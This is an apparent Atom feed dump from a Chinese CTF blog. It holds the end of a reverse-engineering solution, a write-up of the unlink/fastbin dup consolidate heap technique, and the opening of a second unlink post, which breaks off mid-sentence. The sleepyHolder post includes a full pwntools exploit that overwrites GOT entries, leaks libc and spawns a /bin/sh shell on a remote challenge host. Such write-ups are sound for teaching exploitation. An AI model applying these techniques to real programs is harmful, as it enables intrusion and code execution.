class="hljs-number">0x756E69636F726E03</span> * fs_0 + <span class="hljs-number">0xBADC0DEC001CAFE</span>;<br>    <span class="hljs-keyword">return</span> fs_0;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setFSO</span><span class="hljs-params">(<span class="hljs-keyword">int64_t</span> val)</span> </span>&#123;<br>    fs_0 = val;<br>&#125;<br><br><span class="hljs-function">uint64 <span class="hljs-title">test_time</span><span class="hljs-params">(uint64 time)</span> </span>&#123;<br>    uint64  v35;<br>    setFSO(<span class="hljs-number">0x7177625F32303231</span>);<br><br>    uint64 v2 = time ;<br>    uint64  data0 = time ;<br>    uint64 d1, d2,v62, v60;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i != <span class="hljs-number">256</span>; ++i )<br>    &#123;<br>        d1 = <span class="hljs-number">0</span>;<br>        d1 = getFS0();<br>        v62 = d1;<br>        d2 = getFS0();<br>        v60 = d2;<br>        data0 = __ROL8__((data0 ^ d1) + d2 + <span class="hljs-number">33</span> * data0 + <span class="hljs-number">1</span>, <span class="hljs-number">13</span>);<br>        <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>            data0 = v60 ^ (v62 + data0);<br>        <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )<br>            data0 ^= v62 + v60;<br>        <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> )<br>            data0 ^= v60 ^ v62;<br>        v2 = i &amp; <span class="hljs-number">8</span>;<br>        <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>            v2 = data0 + v62 + v60;<br>            data0 = v2;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p ==\n&quot;</span>, data0);<br>    <span class="hljs-keyword">return</span> data0;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Hello, World!&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">unsigned</span> __int64 compare[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">unsigned</span> __int64 xorKey[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags[] = &#123;<span class="hljs-number">0x67616c66</span>, <span class="hljs-number">0x47414c46</span>, <span class="hljs-number">0x7b627771</span>, <span class="hljs-number">0x7b425751</span>&#125;;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> xorkey0[<span class="hljs-number">32</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    uint32  * xorkey0_4 = (uint32  *)xorkey0;<br>    compare[<span class="hljs-number">0</span>] = <span class="hljs-number">0x3EC81D9432CEF584</span>; <span class="hljs-comment">// flag, FLAG, qwb&#123; ,QWB&#123;</span><br>    compare[<span class="hljs-number">1</span>] = <span class="hljs-number">0xB649A4DCD6BD24FE</span>;<br>    compare[<span class="hljs-number">2</span>] = <span class="hljs-number">0xC5927F0B767A787D</span>;<br>    compare[<span class="hljs-number">3</span>] = <span class="hljs-number">0x1F245B7F751BB52E</span>;<br>    xorKey[<span class="hljs-number">0</span>] = <span class="hljs-number">0x178DEC4F232DDB6E</span>;<br>    xorKey[<span class="hljs-number">1</span>] = <span class="hljs-number">0xC2AAB7D6D2A167C3</span>;<br>    xorKey[<span class="hljs-number">2</span>] = <span class="hljs-number">0xF1AB91F72761A80F</span>;<br>    xorKey[<span class="hljs-number">3</span>] = <span class="hljs-number">0x3DCEDC28076C41A</span>;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> * compare_4 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)compare;<br><br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fs;<br>    uint64 v35, v36, v33,v32, v31, v30;<br>    setFSO(<span class="hljs-number">0x5249415452455451</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i_0 = <span class="hljs-number">0</span>; <span class="hljs-number">32</span> != i_0; ++i_0 )<br>    &#123;<br>        uint64 data0 = getFS0();               <span class="hljs-comment">// 0x5249415452455451</span><br>        v35 = i_0;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m != <span class="hljs-number">256</span>; ++m )<br>        &#123;<br>            uint64 data1 = getFS0();<br>            uint64 data2 = getFS0();<br>            v35 = (v35 ^ data1) + data2 + <span class="hljs-number">0x21</span> * v35 + <span class="hljs-number">1</span>;<br><br>            v35 = __ROL8__(v35, <span class="hljs-number">13</span>);<br>            <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>                v35 = data2 ^ (data1 + v35);<br>            <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )<br>                v35 ^= data2 + data1;<br>            <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> )<br>                v35 ^= data2 ^ data1;<br>            <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span> )<br>                v35 += data2 + data1;<br>        &#125;<br>        xorkey0[i_0] =  (_BYTE)data0 + (_BYTE)v35;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> * data = (<span class="hljs-keyword">unsigned</span>  <span class="hljs-keyword">char</span> *)&amp;flags[k];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>            data[i] ^= xorkey0[i];<br>        &#125;<br>       <span class="hljs-comment">// printf(&quot;%x\n&quot;, flags[k]);</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> ii = <span class="hljs-number">0</span>; <span class="hljs-number">32</span> != ii; ++ii )<br>        *((_BYTE *)compare + ii) ^= *((_BYTE *)xorKey + ii);<br><br><br>    uint64 targetTT = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>    &#123;<br>        <span class="hljs-comment">// v27 = from_t0 + _mm_crc32_u32(0, v27);</span><br>      <span class="hljs-comment">//  unsigned int from_t0 = compare_4[0] - _mm_crc32_u32(0, flags[i]);</span><br>        uint64 tt = compare_4[<span class="hljs-number">0</span>] - _mm_crc32_u32(<span class="hljs-number">0</span>, flags[i]);<br>        uint64 rr = test_time(tt);<br>        <span class="hljs-keyword">if</span> (rr == <span class="hljs-number">0x1c986c3b22ea63e5</span>) &#123;<br>            targetTT = tt;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;val:%p\n&quot;</span>, tt);<br>        &#125;<br>    &#125;<br><br>    uint32 flag_arr[<span class="hljs-number">8</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; ++i) &#123; <span class="hljs-comment">// 4 * 8</span><br>        <span class="hljs-keyword">for</span> (uint32 val = <span class="hljs-number">0</span>; val != <span class="hljs-number">0xffffffff</span>; ++val) &#123;<br>            <span class="hljs-keyword">if</span> (compare_4[i] - targetTT == _mm_crc32_u32(<span class="hljs-number">0</span>, val)) &#123;<br>                flag_arr[i] = val;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; ++i) &#123;<br>        flag_arr[i] ^= xorkey0_4[i];<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, (<span class="hljs-keyword">char</span> *)flag_arr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;强网杯-unicorn-like-a-pro&quot;&gt;&lt;a href=&quot;#强网杯-unicorn-like-a-pro&quot; class=&quot;headerlink&quot; title=&quot;强网杯: unicorn_like_a_pro&quot;&gt;&lt;/a&gt;强网杯: unicorn_like_a</summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="Reverse" scheme="https://panda0s.top/tags/Reverse/"/>
    
    <category term="Capstone" scheme="https://panda0s.top/tags/Capstone/"/>
    
    <category term="Unicorn" scheme="https://panda0s.top/tags/Unicorn/"/>
    
    <category term="Keystone" scheme="https://panda0s.top/tags/Keystone/"/>
    
    <category term="Recompile" scheme="https://panda0s.top/tags/Recompile/"/>
    
  </entry>
  
  <entry>
    <title>Unlink 与 fastbin dup consolidate 利用</title>
    <link href="https://panda0s.top/2021/06/11/Unlink-%E4%B8%8E-fastbin-dup-consolidate-%E5%88%A9%E7%94%A8/"/>
    <id>https://panda0s.top/2021/06/11/Unlink-%E4%B8%8E-fastbin-dup-consolidate-%E5%88%A9%E7%94%A8/</id>
    <published>2021-06-11T06:01:18.000Z</published>
    <updated>2021-06-11T06:43:29.310Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unlink-与-fastbin-dup-consolidate-利用"><a href="#Unlink-与-fastbin-dup-consolidate-利用" class="headerlink" title="Unlink 与 fastbin dup consolidate 利用"></a>Unlink 与 fastbin dup consolidate 利用</h1><p>malloc 在分配 large chunk 的时候，会调用 <code>malloc_consolidate</code> 函数。</p><p><code>malloc_consolidate</code> 函数将 fastbin 中的 chunk 与相邻 free chunk 合并，合并后放入 unsorted bin。</p><p>若 chunk 的 next chunk 不是 free chunk，则清除 next chunk 的 size 的 INUSE 标志位。</p><p>可以利用 malloc_consolidate 清理 next chunk size 标志位的性质构造 unlink</p><p>unlink 最主要的思路就是想办法清除掉 INUSE 标志位，构造向后（低地址）unlink 的机会</p><p>unlink fast bin dup consolidate 利用条件：</p><ol><li>存在多次释放漏洞</li><li>可以分配 large chunk</li></ol><h2 id="sleepyHolder-hitcon-2016"><a href="#sleepyHolder-hitcon-2016" class="headerlink" title="sleepyHolder_hitcon_2016"></a>sleepyHolder_hitcon_2016</h2><p>这是一道简单的 unlink 题，只能创建三种类型固定大小的 chunk</p><ol><li>small secret: 40 字节 (fastbin)</li><li>big secret:  4000 字节</li><li>huge secret: 400000 字节</li></ol><p>其中 huge secret 只能在申请的时候改写，不能再次修改和释放，只能利用 huge secret 来触发 malloc_consolidate</p><p>有三种操作:</p><ol><li>Wipe: 释放 small/big</li><li>Renew: 修改 small/big secret</li><li>Keep:申请 small/big/huge , (huge 只能申请一次)</li></ol><p>unlink 操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># unlink</span><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x11&#x27;</span> * <span class="hljs-number">0x28</span>) <span class="hljs-comment"># small secret</span><br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x22&#x27;</span> * <span class="hljs-number">0x28</span>) <span class="hljs-comment"># big secret</span><br><span class="hljs-comment"># 此时 small 与 big 对应的 chunk 相邻</span><br>wipe(<span class="hljs-number">1</span>) <span class="hljs-comment"># fastbin -&gt; small secret</span><br><br><span class="hljs-comment">#  big 对应的 chunk-&gt;size inuse 设置为 0</span><br><span class="hljs-comment">#  fastbin 被清空</span><br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;\x33&#x27;</span> * <span class="hljs-number">0x28</span>) <span class="hljs-comment"># malloc_consolidate</span><br><br><br><span class="hljs-comment"># 将 small bin 再次放入 fastbin</span><br>wipe(<span class="hljs-number">1</span>)  <span class="hljs-comment"># fastbin -&gt; small secret</span><br><br><span class="hljs-comment"># 申请 small secret 再次得到 small secret 控制权</span><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;\x44&#x27;</span> * <span class="hljs-number">0x28</span>)<br><br><span class="hljs-comment"># 在 small 中构造 fake chunk</span><br>target = <span class="hljs-number">0x6020D0</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(target - <span class="hljs-number">0x18</span>) + p64(target - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x20</span>)<br>renew(<span class="hljs-number">1</span>, fake_chunk)<br><br><span class="hljs-comment"># 释放 big，由于 big 对应 chunk-&gt;prev_size INUSE 为 0，则 unlink</span><br>wipe(<span class="hljs-number">2</span>) <span class="hljs-comment"># unlink</span><br></code></pre></td></tr></table></figure><p>unlink 操作后 target = 0x6020D0 (存 small 地址的变量) 的值被修改为 0x6020D0 - 0x18，调用 renew 可控如下所有地址区间</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020B8</span> <span class="hljs-selector-tag">qword_6020B8</span>    <span class="hljs-selector-tag">dq</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">sub_4008F0</span>↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020B8</span>                                         ; <span class="hljs-selector-tag">sub_4008F0</span>+13↑<span class="hljs-selector-tag">w</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C0</span> ; <span class="hljs-selector-tag">void</span> *<span class="hljs-selector-tag">big_ptr</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C0</span> <span class="hljs-selector-tag">big_ptr</span>         <span class="hljs-selector-tag">dq</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span>+11<span class="hljs-selector-tag">E</span>↑<span class="hljs-selector-tag">w</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C0</span>                                         ; <span class="hljs-selector-tag">Keep</span>+139↑<span class="hljs-selector-tag">r</span> ...<br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C8</span> ; <span class="hljs-selector-tag">void</span> *<span class="hljs-selector-tag">huge_ptr</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C8</span> <span class="hljs-selector-tag">huge_ptr</span>        <span class="hljs-selector-tag">dq</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span>+174↑<span class="hljs-selector-tag">w</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C8</span>                                         ; <span class="hljs-selector-tag">Keep</span>+18<span class="hljs-selector-tag">F</span>↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D0</span> ; <span class="hljs-selector-tag">void</span> *<span class="hljs-selector-tag">small_ptr</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D0</span> <span class="hljs-selector-tag">small_ptr</span>       <span class="hljs-selector-tag">dq</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span>+<span class="hljs-selector-tag">C2</span>↑<span class="hljs-selector-tag">w</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D0</span>                                         ; <span class="hljs-selector-tag">Keep</span>+<span class="hljs-selector-tag">DD</span>↑<span class="hljs-selector-tag">r</span> ...<br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D8</span> <span class="hljs-selector-tag">big</span>             <span class="hljs-selector-tag">dd</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span><span class="hljs-selector-pseudo">:loc_400A3D</span>↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D8</span>                                         ; <span class="hljs-selector-tag">Keep</span>+125↑<span class="hljs-selector-tag">w</span> ...<br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020DC</span> <span class="hljs-selector-tag">huge</span>            <span class="hljs-selector-tag">dd</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span>+35↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020DC</span>                                         ; <span class="hljs-selector-tag">Keep</span><span class="hljs-selector-pseudo">:loc_400A96</span>↑<span class="hljs-selector-tag">r</span> ...<br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020E0</span> <span class="hljs-selector-tag">small</span>           <span class="hljs-selector-tag">dd</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span><span class="hljs-selector-pseudo">:loc_4009E1</span>↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020E0</span>                                         ; <span class="hljs-selector-tag">Keep</span>+<span class="hljs-selector-tag">C9</span>↑<span class="hljs-selector-tag">w</span> ...<br></code></pre></td></tr></table></figure><p>完整 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> system<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#libc_file_name = &#x27;/home/pandaos/Projects/pwn/glibc/2.23/64/lib/libc-2.23.so&#x27;</span><br>libc_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/libc-2.23.so&#x27;</span><br>ld_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/ld-linux-x86-64.so.2&#x27;</span><br><span class="hljs-comment"># p = process([ld_file_name, &#x27;./sleepyHolder_hitcon_2016&#x27;],</span><br><span class="hljs-comment">#            env = &#123;&quot;LD_PRELOAD&quot;: libc_file_name&#125;)</span><br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="hljs-number">25711</span>)<br>elf = ELF(<span class="hljs-string">&#x27;sleepyHolder_hitcon_2016&#x27;</span>)<br>libc = ELF(libc_file_name)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">keep</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>, content</span>):</span><br>    <span class="hljs-comment"># 1 small</span><br>    <span class="hljs-comment"># 2 Big</span><br>    <span class="hljs-comment"># 3 huge</span><br>    p.recvuntil(<span class="hljs-string">&#x27;3. Renew secret\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.5</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>))<br>    p.recvuntil(<span class="hljs-string">&#x27;Tell me your secret: \n&#x27;</span>)<br>    p.send(content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">renew</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>, content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;3. Renew secret\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Which Secret do you want to renew?\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>))<br>    p.recvuntil(<span class="hljs-string">&#x27;Tell me your secret: \n&#x27;</span>)<br>    p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wipe</span>(<span class="hljs-params"><span class="hljs-built_in">type</span></span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;3. Renew secret\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;2. Big secret\n&#x27;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>))<br><br><br><br><span class="hljs-comment"># unlink</span><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x11&#x27;</span> * <span class="hljs-number">0x28</span>)<br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x22&#x27;</span> * <span class="hljs-number">0x28</span>)<br>wipe(<span class="hljs-number">1</span>)<br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;\x33&#x27;</span> * <span class="hljs-number">0x28</span>) <span class="hljs-comment"># small presize clear</span><br>wipe(<span class="hljs-number">1</span>)<br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;\x44&#x27;</span> * <span class="hljs-number">0x28</span>)<br><br>target = <span class="hljs-number">0x6020D0</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(target - <span class="hljs-number">0x18</span>) + p64(target - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x20</span>)<br>renew(<span class="hljs-number">1</span>, fake_chunk)<br>wipe(<span class="hljs-number">2</span>) <span class="hljs-comment"># unlink</span><br><br><span class="hljs-comment"># 0x6020D0-0x18 内存可写</span><br>                   <span class="hljs-comment"># big_ptr              # huge_ptr</span><br>payload = p64(<span class="hljs-number">0</span>) + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(<span class="hljs-number">0x00000000006020b8</span>) + p64(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">2</span>, p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>payload = p64(<span class="hljs-number">0</span>) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(<span class="hljs-number">0x00000000006020b8</span>) + p64(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>renew(<span class="hljs-number">1</span>, payload)<br>wipe(<span class="hljs-number">2</span>)<br><br>leak_puts = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>libc_base = leak_puts - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br><br>payload = p64(<span class="hljs-number">0</span>) + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(bin_sh) + p64(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">2</span>, p64(system))<br>wipe(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># input(&quot;&gt;&gt;&quot;)</span><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Unlink-与-fastbin-dup-consolidate-利用&quot;&gt;&lt;a href=&quot;#Unlink-与-fastbin-dup-consolidate-利用&quot; class=&quot;headerlink&quot; title=&quot;Unlink 与 fastbin dup c</summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://panda0s.top/tags/PWN/"/>
    
    <category term="heap" scheme="https://panda0s.top/tags/heap/"/>
    
    <category term="fastbin" scheme="https://panda0s.top/tags/fastbin/"/>
    
    <category term="unlink" scheme="https://panda0s.top/tags/unlink/"/>
    
    <category term="fastbin_dup_consolidate" scheme="https://panda0s.top/tags/fastbin-dup-consolidate/"/>
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="https://panda0s.top/2021/06/11/unlink/"/>
    <id>https://panda0s.top/2021/06/11/unlink/</id>
    <published>2021-06-10T17:34:31.000Z</published>
    <updated>2021-06-10T18:02:46.897Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unlink-攻击"><a href="#Unlink-攻击" class="headerlink" title="Unlink 攻击"></a>Unlink 攻击</h1><p>Unlink 也是一种很常见的堆溢出利用手段</p><p>我认为 unlink 攻击的本质是利用 free 中 unlink 操作修改指向堆块的指针变量 p，使其指向 p-3 处，修改 p[3] 即可修改 p 自身，从而达到任意地址读写的能力。</p><p>利用条件：</p><ol><li>指针变量 p 指向堆分配的地址，且对该地址可读可写</li><li>p 指向的 chunk 的前一个 chunk 可溢出到下一个 chunk 的 size 域</li><li>p 指向的 chunk 的前一个 chunk 大小足够构造 fake chunk</li><li>满足 free unlink 条件</li></ol><p>只要满足上述条件，并合理的在 p 指向 chunk 的物理前一个 chunk 中构造 fake chunk，再调用 free(p) 即可触发 unlink</p><p>p 指向 fake_chunk</p><p>fake chunk 构造如下</p><table><thead><tr><th>pre_size</th><th>0</th></tr></thead><tbody><tr><td>size</td><td>xxxx</td></tr><tr><td>fd</td><td>&amp;p - 0x18</td></tr><tr><td>bk</td><td>&amp;p - 0x10</td></tr></tbody></table><p>unlink 是模版化的题，每次按照这个表填即可。</p><h2 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h2><p>非常简单的 unlink 题，该题在 bss 段保存了一张指针表，每一项都指向 malloc 出来的内存，并且对指向的内存有任意读写的能力，且能溢出写。</p><p>只需要让 p 指向该指针表的某项，并构造 fake chunk ，unlink 之后指针表可控。</p><p>指针表可控后，填入 strlen got 表地址，修改 strlen got 为 